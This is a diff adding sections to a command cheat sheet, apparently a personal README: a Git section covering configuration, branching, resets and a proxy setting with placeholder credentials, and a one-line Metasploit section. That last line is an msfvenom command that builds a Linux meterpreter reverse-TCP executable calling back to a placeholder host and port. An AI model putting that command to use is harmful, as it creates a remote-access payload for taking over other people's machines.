@@ -84,6 +84,38 @@ alien --help
 alien --to-rpm my_pkg.deb
 
 ```
+### Git(github/gitlab)
+
+```
+git config --global user.name "Sam Smith"
+git config --global user.email sam@example.com
+
+git init
+git add README.md
+git commit -m "first commit"
+git remote add origin https:/<URL>
+git push -u origin master
+
+ssh -vT git@github.com
+git remote -v
+git remote set-url --add origin  https://<URL>
+
+git checkout -b <branchname>
+git branch -d <branchname>
+git merge <branchname>
+git diff <sourcebranch> <targetbranch>
+git tag 1.0.0 <commitID>
+git log
+git reset --hard origin/master
+
+# Undo changes without confirming anything yet
+git checkout -- . # Reverse all changes to files that were versioned
+git clean -f -d # Delete all created files and directories
+git reset HEAD . # If you add files to the index (using git add)
+
+git config --global http.proxy http://proxyUsername:proxyPassword@proxy.server.com:port
+```
+
 
 ### Kubernetes 
 
@@ -99,4 +131,10 @@ kubectl get --raw=/apis/metrics.k8s.io/v1beta1/pods  # All pods in the cluster
 kubectl get --raw=/apis/metrics.k8s.io/v1beta1/namespaces/<namespace>/pods # All pods in a specific namespace
 kubectl get --raw=/apis/metrics.k8s.io/v1beta1/namespaces/<namespace>/pods/<pod> # A specific pod
 
+```
+
+### Metasploit
+
+```
+sudo msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o <file_name>
 ```
